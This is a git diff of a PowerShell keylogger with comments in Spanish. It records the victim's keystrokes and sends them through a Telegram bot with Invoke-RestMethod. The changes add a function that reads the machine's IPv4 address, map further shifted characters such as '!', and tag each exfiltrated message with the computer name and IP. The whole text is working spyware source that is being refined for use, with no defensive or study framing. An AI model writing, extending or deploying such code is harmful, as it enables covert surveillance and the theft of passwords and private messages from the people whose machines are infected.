@@ -1,7 +1,7 @@
 $Token = "$tg"
 $PassPhrase = "$env:COMPUTERNAME"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
-$chatID = "6686157223"
+$chatID = ""
 
 # Espera hasta obtener el chat ID
 while ($chatID.length -eq 0) {
@@ -13,6 +13,11 @@ while ($chatID.length -eq 0) {
         }
     }
     Sleep 10
+}
+
+Function Get-IP {
+    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixLength -eq 24}).IPAddress
+    return $ip
 }
 
 Function KeyCapture {
@@ -54,9 +59,10 @@ Function KeyCapture {
                                 if ($asc -eq 2) { $LString = "@" }
                                 elseif ($asc -eq 8) { $LString = "[BKSP]" }
                                 elseif ($asc -eq 13) { $LString = "`n" }
-                                # Otros caracteres especiales que puedan requerir Shift (como '*', '#', etc.)
                                 elseif ($asc -eq 56) { $LString = "*" }
                                 elseif ($asc -eq 51) { $LString = "#" }
+                                elseif ($asc -eq 49) { $LString = "!" }
+                                # Otros caracteres especiales
                             }
 
                             # Actualizamos el texto capturado con la tecla actual
@@ -78,9 +84,10 @@ Function KeyCapture {
             if ($keyPressed) {
                 # Si hay teclas capturadas, las enviamos
                 if ($capturedKeys.Length -gt 0) {
-                    # Agregar timestamp al mensaje
+                    # Obtener IP y timestamp
+                    $ip = Get-IP
                     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                    $escmsg = "Keys Captured at $timestamp: " + $capturedKeys
+                    $escmsg = "Keys Captured at $timestamp from $env:COMPUTERNAME ($ip): " + $capturedKeys
 
                     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$escmsg" -Force
                     irm -Method Post -Uri ($URL + '/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
